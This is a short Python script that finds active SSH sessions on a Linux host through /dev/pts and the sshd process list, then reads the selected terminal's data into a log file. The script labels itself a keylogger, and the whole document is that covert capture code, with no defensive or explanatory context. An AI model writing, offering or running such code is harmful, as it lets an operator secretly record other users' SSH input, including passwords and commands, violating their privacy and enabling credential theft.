import os
import pexpect
import sys
from datetime import datetime

# Log file
LOG_FILE = "ssh_keystrokes.log"

def log_keystrokes(pty):
    print(f"Monitoring SSH session on {pty}... (Press CTRL+C to stop)")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"\n\n--- New Session [{datetime.now()}] ---\n")
            while True:
                # Read from PTY (non-blocking)
                try:
                    data = os.read(pty, 1024)
                    if not data:
                        break
                    decoded = data.decode("utf-8", errors="ignore")
                    f.write(decoded)
                    f.flush()
                except BlockingIOError:
                    pass
    except KeyboardInterrupt:
        print("\nStopping keylogger...")

def find_ssh_ptys():
    ptys = []
    for fd in os.listdir("/dev/pts"):
        if fd.isdigit():
            pty_path = f"/dev/pts/{fd}"
            try:
                # Check if it's an active SSH session
                cmd = f"ps -o cmd= -t {pty_path}"
                proc = pexpect.run(cmd, timeout=1)
                if "sshd" in proc.decode():
                    ptys.append(pty_path)
            except:
                continue
    return ptys

if __name__ == "__main__":
    ptys = find_ssh_ptys()
    if not ptys:
        print("No active SSH sessions found!")
        sys.exit(1)

    print("Active SSH sessions:")
    for i, pty in enumerate(ptys):
        print(f"{i+1}. {pty}")

    choice = int(input("Select session to monitor (1-{}): ".format(len(ptys)))) - 1
    selected_pty = open(ptys[choice], "rb")

    log_keystrokes(selected_pty.fileno())
